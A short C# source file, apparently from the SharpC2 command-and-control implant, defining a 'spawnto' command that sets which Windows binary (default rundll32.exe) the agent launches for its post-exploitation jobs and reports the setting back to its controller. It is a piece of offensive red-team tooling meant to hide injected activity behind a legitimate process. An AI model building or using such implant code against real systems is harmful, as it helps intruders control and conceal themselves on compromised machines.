using System.IO;

using Agent.Models;
using Agent.Common;
using Agent.Controllers;

namespace Agent.Commands
{
    internal class SpawnTo
    {
        internal static void SetConfig(string data, AgentController agent, ConfigurationController config)
        {
            // if no args, reset to default
            if (string.IsNullOrEmpty(data))
            {
                config.SetOption(ConfigurationSettings.SpawnTo, @"%windir%\system32\rundll32.exe");
            }
            else
            {
                if (File.Exists(data))
                {
                    config.SetOption(ConfigurationSettings.SpawnTo, data);
                }
                else
                {
                    agent.SendError("stageone", "spawnto", "Path not found");
                    return;
                }
            }

            var result = new SharpC2ResultList<SpawnToSetting>
            {
                new SpawnToSetting
                {
                    Path = (string)config.GetOption(ConfigurationSettings.SpawnTo)
                }
            };

            agent.SendCommandOutput(result.ToString());
        }
    }
}